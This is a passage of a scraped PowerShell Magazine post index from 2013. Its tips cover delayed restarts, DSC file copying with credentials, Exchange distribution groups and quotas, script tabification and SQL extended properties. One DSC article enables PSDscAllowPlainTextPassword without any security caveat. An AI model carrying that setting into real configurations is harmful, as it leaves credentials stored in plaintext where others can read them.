","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/10/08/pstip-parsing-exchange-size-strings/","tags":["Tips and Tricks"],"title":"#PSTip Parsing Exchange size strings"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nRestart-Computer, no surprise, does the job of restarting a computer but there are times when you want to add the functionality to abort a restart. Something along the lines of “Restarting computer in 30 seconds, Press any key to cancel…”. It reminds me of good, old days of batch scripting.\nThe function Restart-ComputerWithDelay is a quick and dirty way to achieve this functionality and also provides a countdown timer.\nFunction Restart-ComputerWithDelay { Param( [int]$TimeOutinSeconds = 30, [string[]]$ComputerName = $env:COMPUTERNAME ) Write-Host \u0026quot;Press any key to abort. Restarting in $TimeOutinSeconds\u0026quot; -NoNewLine While ($TimeOutinSeconds -gt 0 -and -not $host.UI.RawUI.KeyAvailable) { Start-Sleep -Seconds 1 $TimeOutinSeconds -- Write-Host –NoNewLine \u0026quot;,$TimeOutinSeconds\u0026quot; } if ($Host.UI.RawUI.KeyAvailable -eq $false) { Write-Host \u0026quot;`nRestarting Computer(s)...\u0026quot; Restart-Computer -ComputerName $ComputerName -Force } else { $Host.UI.RawUI.FlushInputBuffer() Write-Host \u0026quot;`nRestart Aborted!\u0026quot; } } Restart-ComputerWithDelay # Restart-ComputerWithDelay –TimeOutinSeconds 15 –ComputerName \u0026quot;Demo1\u0026quot;,\u0026quot;Demo2\u0026quot;  With a slightly different logic and with less lines of code, you can implement the above functionality using the Ctrl + C key combination.\nWrite-Host \"Restarting in 30 seconds. Press CTRL-C to abort or any key to restart…\"   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/27/pstip-offer-delayed-restart-with-abort-functionality/","tags":["Tips and Tricks"],"title":"#PSTip Offer Delayed Restart with Abort Functionality"},{"categories":["PowerShell DSC"],"contents":"In an earlier article, I showed you copying DSC resources and PowerShell modules to remote computers. In that article, I showed a method to authorize remote computers to access the UNC path. For the File and Package resources, this is not necessary. These two resources support the Credential attribute for authenticating to the UNC path. However, the story is different for the Archive resource. It has no Credential attribute which is not only inconsistent but also painful as this forces us to change the computer account permissions for the UNC path or use workarounds such as employing File resource to perform the local copy and then extracting the files using Archive resource. Now, why do we have to perform multiple steps for just extracting files from a simple archive?\nSome of you might say that extracting over the wire isn’t recommended and it is always good to copy the files to a local system before extraction. I don’t agree. The file copy to local system has more or less the same impact on your network resources as extracting over wire.\nSo, if you also think that the Archive resource must have the Credential attribute, go ahead and vote for this Connect suggestion: DSC Archive resource should have the Credential attribute.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/27/connect-suggestion-dsc-archive-resource-needs-the-credential-attribute/","tags":["PowerShell DSC"],"title":"Connect suggestion: DSC Archive resource needs the Credential attribute"},{"categories":["PowerShell DSC"],"contents":"In an article about copying DSC custom resources to remote systems, I talked about setting computer account permissions. Many of us, including me, may not always want to do that given the number of computers to be managed or various other security concerns. As I’d mentioned at the end of that article, there is a Credential attribute which can be used to specify the credentials to access the network share.\nLet us start with an example showing how this attribute can be used.\nConfiguration CopyDSCResource { param ( [Parameter(Mandatory=$true)] [ValidateNotNullOrEmpty()] [String[]]$NodeName, [Parameter(Mandatory=$true)] [String]$SourcePath, [Parameter(Mandatory=$false)] [PSCredential]$Credential, [Parameter(Mandatory=$false)] [String]$ModulePath = \u0026quot;$PSHOME\\modules\\PSDesiredStateConfiguration\\PSProviders\u0026quot; ) Node $NodeName { File DSCResourceFolder { SourcePath = $SourcePath DestinationPath = $ModulePath Recurse = $true Type = \u0026quot;Directory\u0026quot; Credential = $Credential } } } CopyDSCResource -NodeName SRV2-WS2012R2,SRV3-WS2012R2 -SourcePath \u0026quot;\\\\10.10.10.101\\DSCResources\u0026quot; -Credential (Get-Credential)  When we dot-source this configuration, we expect to see the MOF files created for the server nodes specified. But, this is what we would end up seeing.\nPS C:\\demo\u0026gt; .\\Demo1.ps1 cmdlet Get-Credential at command pipeline position 1 Supply values for the following parameters: ConvertTo-MOFInstance : System.InvalidOperationException error processing property 'Credential' OF TYPE 'File': Converting and storing an encrypted password as plaintext is allowed only if PSDscAllowPlainTextPassword is set to true. At C:\\demo\\Demo1.ps1:19 char:9 + File At line:164 char:16 + $aliasId = ConvertTo-MOFInstance $keywordName $canonicalizedValue + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (:) [Write-Error], InvalidOperationException + FullyQualifiedErrorId : FailToProcessProperty,ConvertTo-MOFInstance ConvertTo-MOFInstance : System.InvalidOperationException error processing property 'Credential' OF TYPE 'File': Converting and storing an encrypted password as plaintext is allowed only if PSDscAllowPlainTextPassword is set to true. At C:\\demo\\Demo1.ps1:19 char:9 + File At line:164 char:16 + $aliasId = ConvertTo-MOFInstance $keywordName $canonicalizedValue + ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (:) [Write-Error], InvalidOperationException + FullyQualifiedErrorId : FailToProcessProperty,ConvertTo-MOFInstance Errors occurred while processing configuration 'CopyDSCResource'. At C:\\Windows\\system32\\WindowsPowerShell\\v1.0\\Modules\\PSDesiredStateConfiguration\\PSDesiredStateConfiguration.psm1:1991 char:5 + throw $errorRecord + ~~~~~~~~~~~~~~~~~~ + CategoryInfo : InvalidOperation: (CopyDSCResource:String) [], InvalidOperationException + FullyQualifiedErrorId : FailToProcessConfiguration If you observe the output, it talks about PSDscAllowPlainTextPassword for converting the encrypted password acquired using Get-Credential cmdlet. But, where do we place this attribute and set it to True? We need to do that as a part of node configuration. To make this work, we need to use the configuration data for the node attributes. Simply put, DSC configuration data is a hash table that contains an array of hash table entries for each node. Here is a sample.\n$ConfigurationData = @{ AllNodes = @( @{ NodeName=\u0026quot;*\u0026quot; PSDscAllowPlainTextPassword=$true } @{ NodeName=\u0026quot;SRV2-WS2012R2\u0026quot; } @{ NodeName=\u0026quot;SRV3-WS2012R2\u0026quot; } ) } Make a note of the hash table key names that are used in $ConfigurationData. The top-level hash table should have AllNodes key whose value is an array of hash tables. Each hash table inside this array must have a key named NodeName whose value can either be “” or the target system name. The PSDscAllowPlainTextPassword attribute needs to be added to any of the hash tables inside the array. Since this attribute applies to all the nodes, we can put it inside the hash table which has NodeName set to “”. The attributes we specify within this hash table apply to all nodes in the configuration data.\nLet us get back to the original subject.\nThe following configuration document demonstrates how we use the configuration data along with Credential attribute to authenticate to the network path.\n$ConfigurationData = @{ AllNodes = @( @{ NodeName=\u0026quot;*\u0026quot; PSDscAllowPlainTextPassword=$true } @{ NodeName=\u0026quot;SRV2-WS2012R2\u0026quot; } @{ NodeName=\u0026quot;SRV3-WS2012R2\u0026quot; } ) } Configuration CopyDSCResource { param ( [Parameter(Mandatory=$true)] [ValidateNotNullOrEmpty()] [String]$SourcePath, [Parameter(Mandatory=$false)] [PSCredential]$Credential, [Parameter(Mandatory=$false)] [String]$ModulePath = \u0026quot;${PSHOME}\\modules\\PSDesiredStateConfiguration\\PSProviders\u0026quot; ) Node $AllNodes.NodeName { File DSCResourceFolder { SourcePath = $SourcePath DestinationPath = $ModulePath Recurse = $true Type = \u0026quot;Directory\u0026quot; Credential = $Credential MatchSource = $true } } } CopyDSCResource -ConfigurationData $configurationData -SourcePath \u0026quot;\\\\10.10.10.101\\DSCResources\u0026quot; -Credential (Get-Credential) After we dot-source this configuration document, we can use Start-DscConfiguration cmdlet to apply the configuration. At this point, you will see that the remote server is able to connect to the share using given credentials and perform the configuration change.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/26/using-the-credential-attribute-of-dsc-file-resource/","tags":["PowerShell DSC"],"title":"Using the Credential attribute of DSC File Resource"},{"categories":["News"],"contents":"We are very happy to announce Kemp Technologies as our technology partner.\nKemp Technologies is an emerging leader in theload balancers and application delivery optimization market. Kemp’s solutions cater to multiple industry segments and include solutions that are built on hardware as well as virtual appliances. Since 2000, with over 15,000 worldwide clients and offices in America, Europe, Asia and South America, KEMP Technologies has been a leader in driving the price/performance value proposition for load balancers and application delivery controllers to levels that customers can afford. KEMP Technologies LoadMaster line of Load Balancers integrates powerful, stable, full-featured load balancers with layer-7 content switching, SSL acceleration and security. KEMP has created an ideal family of products for customers looking for the best price/performance value proposition in high availability application delivery.\nIf you are an Exchange or any application administrator, you must have heard about the need for load balancing the application services and a constant need to monitor these load balanced services. Kemp Technologies products can be managed over RESTFul API which means PowerShell is the perfect choice to automate the management of Kemps equipment in your data center. Stay tuned for more on this.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/18/announcing-kemp-technologies-as-a-technology-partner/","tags":["News"],"title":"Announcing Kemp Technologies as a technology partner"},{"categories":["Tips and Tricks","Exchange"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nGetting the members of a dynamic distribution group in the Exchange Management Console (EMC) is not an issue; you open the group and click the Preview button.\nHowever, if you list the properties of the group in the Exchange Management Shell (EMS) you will not find the members as they are determined at the run time by the custom filter used when the group was created. Viewing the members of the group is twofold–you get the group’s recipient filter and use it with the Get-Recipient cmdlet!\n$ddg = Get-DynamicDistributionGroup ITUsers Get-Recipient –RecipientPreviewFilter $ddg.RecipientFilter ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/13/pstip-preview-the-members-of-a-dynamic-distribution-group/","tags":["Tips and Tricks","Exchange"],"title":"#PSTip Preview the members of a dynamic distribution group"},{"categories":["News"],"contents":"Mobile PC Monitor is an innovative solution for monitoring and managing mission-critical IT systems using a secure mobile application that gives IT administrators complete control of their critical servers and applications from anywhere, anytime. It dramatically reduces the level of manual checks support engineers have to do on a daily basis and provides them with a real time status of their monitored systems.\nThe mobile application is available on iOS, Android, Windows Phone, BlackBerry and Windows 8. A web-based application is also available with support for major web browsers. Integrated server modules offer in-depth management tools for popular server applications including Microsoft IIS Server , Microsoft SQL Server, Microsoft Exchange, Microsoft Hyper-V, VMware vSphere, Citrix Xen Server, Microsoft Active Directory, and Microsoft Windows Server Backup.\nPC Monitor also offers a public API so that developers can integrate their own applications into the solution allowing you to add custom features. They can either choose to create a plugin that is inserted right into the agent installed on each system or a cloud instance that is a mobile interface to their own .NET or Java application. The agent support Windows, Mac, and Linux operating systems.\nOne interested plugin I’ve found in the website forum was PowerOfTheShell. It allows you to run PowerShell scripts while you are on the go and get the results immediately from within PC Monitor directly on your mobile device. You can find more information about the plugin and its author here.\nPC Monitor is free for non-commercial use and you can monitor up to 5 computers or applications with no subscription payment required and no time limitation. To create an account you will need to download and install the PC software from \u0026lt;www.mobilepcmonitor.com\u0026gt; first. A quick setup guide is available on the web site.\n ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/13/pc-monitor-remotely-monitor-and-manage-your-critical-systems/","tags":["News"],"title":"PC Monitor – Remotely monitor and manage your critical systems"},{"categories":["Exchange","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nOne of the group types that Exchange can create is a dynamic distribution group. Unlike regular distribution groups that contain a defined set of members, the membership list for dynamic distribution groups is calculated each time a message is sent to the group, based on the filters and conditions that you define. When an email message is sent to a dynamic distribution group, it is delivered to all recipients in the organization that match the criteria defined for that group.\nTo create a dynamic distribution group use the New-DynamicDistributionGroup cmdlet. This example creates a dynamic distribution that contains only mailbox users from the Users OU.\nPS\u0026gt; New-DynamicDistributionGroup -IncludedRecipients MailboxUsers -Name MailboxUsersDDG -OrganizationalUnit Users  This example creates a dynamic distribution group, ITUsers, with a custom recipient filter. It contains all mailbox users from the Users OU who are members of the Computers department.\nPS\u0026gt; $itUsers = New-DynamicDistributionGroup -Name ITUsers -RecipientFilter {RecipientType -eq 'UserMailbox' -and Department -eq 'Computers'} -OrganizationalUnit Users PS\u0026gt; $itUsers | fl *filter RecipientFilter : ((((RecipientType -eq 'UserMailbox') -and (Department -eq 'Computers'))) -and (-not(Name -like 'S ystemMailbox{*')) -and (-not(Name -like 'CAS_{*')) -and (-not(RecipientTypeDetailsValue -eq 'Mail boxPlan')) -and (-not(RecipientTypeDetailsValue -eq 'DiscoveryMailbox')) -and (-not(RecipientType DetailsValue -eq 'ArbitrationMailbox'))) LdapRecipientFilter : (\u0026amp;(objectClass=user)(objectCategory=person)(mailNickname=*)(msExchHomeServerName=*)(department=Co mputers)(!(name=SystemMailbox{*))(!(name=CAS_{*))(!(msExchRecipientTypeDetails=16777216))(!(msExc hRecipientTypeDetails=536870912))(!(msExchRecipientTypeDetails=8388608))) In the next tip we will see how to list the members of the dynamic distribution group. Stay tuned.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/12/pstip-how-to-create-a-dynamic-distribution-group/","tags":["Exchange","Tips and Tricks"],"title":"#PSTip How to create a dynamic distribution group"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 4.0 or above.\nThe #Requires statement allows us to prevent a script from running without the required elements. For example, we can specify a minimum version of PowerShell that the script requires.\n#Requires -Version 3  Other elements can be a PSSnapin, Module, and a specific ShellId (see the about_Requires topic). PowerShell 4.0 added another useful prerequisite: RunAsAdministrator. When this switch parameter is added to your Requires statement, it specifies that the Windows PowerShell session in which you are running the script must be started with elevated user rights (in other words, by using the ‘Run as Administrator’ option).\nThe following statements require the ActiveDirectory module and elevated user rights. If the ActiveDirectory module is not in the current session, PowerShell will import it. If the module cannot be imported, PowerShell throws a terminating error. If you haven’t used “Run as Administrator” option to start your PowerShell session, you will get an error as well.\n#Requires -Modules ActiveDirectory #Requires -RunAsAdministrator   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/11/pstip-how-to-prevent-script-execution-for-non-admin-users/","tags":["Tips and Tricks"],"title":"#PSTip How to prevent script execution for non-admin users"},{"categories":["Exchange","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn a previous tip we saw how to configure storage quotas for a mailbox using PowerShell. Today we will see how we can find all mailboxes that are over quota or received a quota message. Let’s check the quota status for a given mailbox. Open the Exchange Management Console (EMC) and type the following commands:\nPS\u0026gt; $stats = Get-Mailbox user1 | Get-MailboxStatistics PS\u0026gt; $stats.StorageLimitStatus BelowLimit  You can see that the quota limit has not been reached and that the mailbox capacity is below the limit. StorageLimitStatus is a System.Enum object that holds several values:\nPS\u0026gt; $stats.StorageLimitStatus.GetType().FullName Microsoft.Exchange.Data.Mapi.StorageLimitStatus PS\u0026gt; [enum]::GetNames('Microsoft.Exchange.Data.Mapi.StorageLimitStatus') BelowLimit IssueWarning ProhibitSend NoChecking MailboxDisabled We can check the status of all mailboxes on a given database:\nPS\u0026gt; Get-Mailbox -Database db1 | Get-MailboxStatistics | Select-Object DisplayName,StorageLimitStatus DisplayName StorageLimitStatus ----------- ------------------ User1 BelowLimit User2 IssueWarning User3 BelowLimit (...) Or for all mailboxes. You may want to refine the search to return just the mailboxes with a specified StorageLimitStatus value (over quota).\nPS\u0026gt; Get-MailboxDatabase | Get-MailboxStatistics | Where-Object {$_.StorageLimitStatus -match 'IssueWarning|ProhibitSend|MailboxDisabled'} DisplayName ItemCount StorageLimitStatus LastLogonTime ----------- --------- ------------------ ------------- User2 2400 IssueWarning User4 5010 IssueWarning 9/8/2013 10:04:20 AM User5 2956 IssueWarning 9/8/2013 10:03:46 AM User6 2316 MailboxDisabled 9/8/2013 9:53:11 AM User7 4433 ProhibitSend Note: To check the status of archive mailboxes, add the –Archive switch to the Get-Mailbox command.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/10/pstip-how-to-find-which-mailboxes-are-over-quota-limits/","tags":["Exchange","Tips and Tricks"],"title":"#PSTip How to find which mailboxes are over quota limits"},{"categories":["News","Module Spotlight","PSReadLine"],"contents":"Jason Shirk is back! He just announced the release of his new PowerShell project PSReadLine. In PowerShell 3.0, a hook was added to replace the command line editing experience in the console and Jason wrote a new module to take advantage of this hook. This module is really meant for PowerShell console and not for ISE.\nThe following list of features are available in the first release.\n Syntax coloring Simple syntax error notification A better multi-line experience (both editing and history) Customizable key bindings Cmd and emacs modes (neither are fully implemented yet, but both are usable) Many configuration options Bash style completion (optional in Cmd mode, default in Emacs mode) Emacs yank/kill ring PowerShell token based “word” movement and kill  A quick overview of this module and how it can be used has been documented at https://github.com/lzybkr/PSReadLine/blob/master/README.md\nGo ahead and download the module. If you are interested, you can even fork it and add your own set of features.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/10/announcing-psreadline-a-bash-inspiried-readline-implementation-for-powershell/","tags":["PSReadLine","Modules","News"],"title":"Announcing PSReadLine – A bash-inspired readline implementation for PowerShell"},{"categories":["Exchange","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nExchange lets us configure mailbox storage quotas for a mailbox, control the size of mailboxes and manage the growth of mailbox databases. Storage quotas can be configured on a per-database basis or explicitly on a mailbox level. When a mailbox size reaches or exceeds a specified storage quota limit, Exchange sends a descriptive notification to the mailbox owner.\nWe can set storage quota limits for the following fields:\n Issue warning at (KB) : Specifies the maximum storage limit in kilobytes (KB) before a warning is issued to the mailbox user. The value range is from 0 through 2,147,483,647 KB. If the mailbox size reaches or exceeds the value specified, Exchange sends a warning message to the mailbox user. Prohibit send at (KB) : Specifies a prohibit send limit in KB for the mailbox. The value range is from 0 through 2,147,483,647 KB. If the mailbox size reaches or exceeds the specified limit, Exchange prevents the mailbox user from sending new messages and displays a descriptive error message. Prohibit send and receive at (KB) : Specifies a prohibit send and receive limit in KB for the mailbox. The value range is from 0 through 2,147,483,647 KB. If the mailbox size reaches or exceeds the specified limit, Exchange prevents the mailbox user from sending new messages and won’t deliver any new messages to the mailbox. Any messages sent to the mailbox are returned to the sender with a descriptive error message.  To set these limits explicitly on a mailbox object, use the Set-Mailbox cmdlet. Launch the Exchange Management Console (EMC) and type the following command:\nSet-Mailbox -Identity jsmith -IssueWarningQuota 1.7 -ProhibitSendQuota 1.9gb -ProhibitSendReceiveQuota 2gb -UseDatabaseQuotaDefaults $false   ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/09/pstip-how-to-configure-storage-quotas-for-a-mailbox-using-powershell/","tags":["Exchange","Tips and Tricks"],"title":"#PSTip How to configure storage quotas for a mailbox using PowerShell"},{"categories":["Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nThere are several things you can do to make more readable scripts. You can do good documentation and use variables that are meaningful. If you have your curly brackets in random places and functions that are longer than 5 or 6 lines things can still be unreadable. This is a little easier if you are using the PowerShell 3.0 or 4.0 ISE and can collapse blocks of code.\nFortunately there are a few things that we can do to make the braces show up in a more uniform location.\nPowerShell 2.0 provides a Tokenize function in the PSParser class that will parse your script and give you a collection containing all text parts of the script. A quick utility that can be made from the tokens is a tabification of the script.\nfunction Tabify-PS2Script { Param($ScriptText) $CurrentLevel = 0 $ParseError = $null $Tokens = [System.Management.Automation.PSParser]::Tokenize($ScriptText,[ref]$ParseError) if($ParseError) { $ParseError | Write-Error throw \u0026quot;The parser will not work properly with errors in the script, please modify based on the above errors and retry.\u0026quot; } for($t = $Tokens.Count -1 ; $t -ge 1; $t--) { $Token = $Tokens[$t] $NextToken = $Tokens[$t-1] if ($Token.Type -eq 'GroupStart') { $CurrentLevel-- } if ($NextToken.Type -eq 'NewLine' ) { # Grab Placeholders for the Space Between the New Line and the next token. $RemoveStart = $NextToken.Start + 2 $RemoveEnd = $Token.Start - $RemoveStart $tabText = \u0026quot;`t\u0026quot; * $CurrentLevel $ScriptText = $ScriptText.Remove($RemoveStart,$RemoveEnd).Insert($RemoveStart, $tabText) } if ($token.Type -eq 'GroupEnd') { $CurrentLevel++ }\t} $ScriptText }  PowerShell 3.0 provides an additional parse routine that generates the AST that is used to run the script. The 2.0 Tokenize will work in 3.0 but it is good to see how when accomplishing the same task there are a few nuanced differences. These small differences are helpful to understand if you want to try to do other things with the AST to do analysis on a script or do more advanced code cleanup.\nfunction Tabify-PS3Script {\tParam($ScriptText) $CurrentLevel = 0 $ParseError = $null $Tokens = $null $AST = [System.Management.Automation.Language.Parser]::ParseInput($ScriptText, [ref]$Tokens, [ref]$ParseError)\tif($ParseError) { $ParseError | Write-Error throw \u0026quot;The parser will not work properly with errors in the script, please modify based on the above errors and retry.\u0026quot; } for($t = $Tokens.Count -2; $t -ge 1; $t--) { $Token = $Tokens[$t] $NextToken = $Tokens[$t-1] if ($token.Kind -match '(L|At)Curly') { $CurrentLevel-- } if ($NextToken.Kind -eq 'NewLine' ) { # Grab Placeholders for the Space Between the New Line and the next token. $RemoveStart = $NextToken.Extent.EndOffset $RemoveEnd = $Token.Extent.StartOffset - $RemoveStart $tabText = \u0026quot;`t\u0026quot; * $CurrentLevel $ScriptText = $ScriptText.Remove($RemoveStart,$RemoveEnd).Insert($RemoveStart,$tabText) } if ($token.Kind -eq 'RCurly') { $CurrentLevel++ }\t} $ScriptText } $psISE.CurrentFile.Editor.Text = Tabify-PS2Script $psISE.CurrentFile.Editor.Text #or $psISE.CurrentFile.Editor.Text = Tabify-PS3Script $psISE.CurrentFile.Editor.Text  ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/03/pstip-tabify-your-script/","tags":["Tips and Tricks"],"title":"#PSTip Tabify your Script"},{"categories":["PowerShell DSC"],"contents":"In an earlier article, I showed you a custom DSC resource I built for managing hosts file entries, but I did not tell you that the custom DSC resource must exist on the remote system at a predefined path. When using push configuration model for configuration management, without copying the custom DSC resource, you cannot really apply any configuration supported by the resource. In DSC, there is also a pull model for configuration management which eliminates the need for you to take care of copying the DSC resources to remote systems. We will save this for a later article.\nIn this article I will show you how to copy the DSC resources from a network share to a set of remote systems using DSC. Before we get started, we need to create a network share and copy all the custom DSC resources.\nOnce we copy all the custom DSC resources, we need to assign permissions to the computer accounts that are target nodes for this configuration. This is required because the DSC Local Configuration Manager runs as the SYSTEM account and won’t have access to network resources. In my lab setup, I just have three virtual machines running Windows PowerShell 4.0 for all my DSC-related work. I have added all the computer accounts to the share with Read permission. As I’d mentioned, this is required and without this you will receive an access denied error when you try to copy files from a network share to a remote system. Thanks to Steven Murawski for this tip!\nNow, coming to the actual DSC configuration document, we will use a File resource to perform a copy of a network share contents to a module path for custom DSC resources.\nConfiguration CopyDSCResource { param ( [Parameter(Mandatory=$true)] [ValidateNotNullOrEmpty()] [String[]]$NodeName, [Parameter(Mandatory=$false)] [ValidateNotNullOrEmpty()] [String]$SourcePath, [Parameter(Mandatory=$false)] [ValidateNotNullOrEmpty()] [String]$ModulePath = \u0026quot;$PSHOME\\modules\\PSDesiredStateConfiguration\\PSProviders\u0026quot; ) Node $NodeName { File DSCResourceFolder { SourcePath = $SourcePath DestinationPath = $ModulePath Recurse = $true Type = \u0026quot;Directory\u0026quot; } } } CopyDSCResource -NodeName SRV2-WS2012R2,SRV3-WS2012R2 -SourcePath \u0026quot;\\\\10.10.10.101\\DSCResources\u0026quot;  Once you customize the above configuration document for your requirements, save it as a .ps1 file. Notice the last line in the script where we are specifying the computer names as arguments to the –NodeName parameter and the -SourcePath where all the custom DSC resources are stored.\nWe can now build the MOF files by dot-sourcing the configuration document and then apply the configuration using Start-DscConfiguration cmdlet.\nPS C:\\demo\u0026gt; .\\demo.ps1 PS C:\\demo\u0026gt; Start-DscConfiguration -Wait -Verbose -Path .\\CopyDSCResource  Once we complete applying the configuration using the Start-DscConfiguration cmdlet, we can see the custom resource folder in the network share copied to the specified module path.\nAlright, I must admit this is just one way of copying the files from a network share to a remote system. If you have paid enough attention to the attributes available in the File resource, you will ask me a question about the Credential attribute. Yes, this attribute can be used to specify the credentials to access the network share. The Credential attribute eliminates the need for assigning permissions to computer accounts – what is discussed in this article – to access the network shares when applying DSC configuration. However, the Credential attribute comes with its own baggage. Let us save that for a later post! 🙂\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/09/02/copying-powershell-modules-and-custom-dsc-resources-using-dsc/","tags":["PowerShell DSC"],"title":"Copying PowerShell modules and custom DSC resources using DSC"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn earlier tips, we looked at how to add, read and update the extended properties of a SQL database. In this tip we will see how we can delete them, in-case we need to do some cleanup.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties | Select Name, Value, State Name Value State ---- ----- ----- Change made Set recovery model to simple Existing Change madeby Crack-Monkey Existing #drop the extended property $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties[\u0026quot;Change made\u0026quot;].Drop() $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties | Select Name, Value, State Name Value State ---- ----- ----- Change madeby Crack-Monkey Existing ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/30/pstip-deleting-extended-properties/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Deleting extended properties on database objects using SMO"},{"categories":["News","Dell","Module Spotlight"],"contents":"Dell announced the availability of beta version of PowerShell module for Dell vWorkspace. As per the announcement, the features included in this beta release are:\n vWorkspace 8.0 Support Cmdlets for Web Access website configuration management Cmdlets for managed domain configuration Cmdlets for managing delegated permissions More comprehensive managed application cmdlets  The new beta version of the vWorkspace PowerShell can be downloaded here:\nx86 vWorkspace PowerShell module \nx64 vWorkspace PowerShell module\nFull documentation on the module can be found here: http://wiki.vworkspace.inside.quest.com/index.php/Main_Page\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/30/dell-announced-the-availability-of-vworkspace-powershell-module-beta/","tags":["Dell","vworkspace","News","Modules"],"title":"Dell announced the availability of vWorkspace PowerShell module beta"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nIn an earlier tip, we saw how we can read extended properties to a database. In this tip we see how we can alter them.\nWe can use extended properties to keep a record of the configuration changes made to the DB. Assuming we already have a set of extended properties called ‘Change made’ and ‘Change made by’, let us see how we can update these properties.\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties | Select Name, Value, State Name Value State ---- ----- ----- Change made Recovery Model set to BulkLogged Existing Change madeby CandidConvos Existing $proptochange = $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties[\u0026quot;Change made by\u0026quot;] $proptochange.Value = \u0026quot;Crack-Monkey\u0026quot; $proptochange.Alter() $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties | Select Name, Value, State Name Value State ---- ----- ----- Change made Recovery Model set to BulkLogged Existing Change madeby Crack-Monkey Existing ","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/29/pstip-updating-extended-properties-on-database-objects-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Updating extended properties on database objects using SMO"},{"categories":["News"],"contents":"Have you ever been asked this question and scratched your head for an answer? If so (and if not), Mark Minasi, is doing a free 40 to 60 minute webinar on the subject. Today (Thursday, 29 August) at 9 AM Pacific, noon Eastern, called “The Case For PowerShell: Why You Should Learn-PowerShell So You Don’t Have to Leave-Industry.”\nRegister for the webinar and you might get an answer or two.\nhttp://www.learnit.com/PrivateRegs/ClassRegistrations.aspx?er=a37041EA37018\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/29/why-powershell/","tags":["News"],"title":"Why PowerShell?"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nExtended properties are an useful but, under utilized feature in SQL server. In an earlier tip, we saw that you can add extended properties to databases and other objects. You can also add them to columns in your tables, and many other objects in your databases.\nNow for the fun part. Let us say we have a database ‘sqlchow’ in your instance. We can retrieve the extended properties, if they have been set, using the following code:\nAdd-Type -AssemblyName \u0026quot;Microsoft.SqlServer.Smo, Version=10.0.0.0, Culture=neutral, PublicKeyToken=89845dcd8080cc91\u0026quot; $server = New-Object Microsoft.SqlServer.Management.Smo.Server $env:COMPUTERNAME $server.Databases[\u0026quot;sqlchow\u0026quot;].ExtendedProperties | Select Name, Value, State Name Value State ---- ----- ----- CreatedBy sqlchow Existing CreatedOn 2013-08-17 13:00:06 Existing Generate Documentation 1 Existing Purpose Demo creation of extended properties Existing  In the next tip let us see how we can alter extended properties on an object.\n","image":"https://powershellmagazine.com/images/posts/psarm.png","permalink":"https://powershellmagazine.com/2013/08/28/pstip-reading-extended-properties-on-database-objects-using-smo/","tags":["Tips and Tricks","SQL"],"title":"#PSTip Reading extended properties on database objects using SMO"},{"categories":["SQL","Tips and Tricks"],"contents":"Note: This tip requires PowerShell 2.0 or above.\nYou might have seen several articles on the web discussing about the SQL database extended properties from a self-documentation point of view. I believe that we can use extended properties for much more than self-documentation.\nHere is an example. Lets say you make a change to a DB configuration as part of a request. If you add the details and date of the change to the DB then, you exactly know what to revert when you have to do it 3-4 weeks down the line.\nSo, let us see how we can 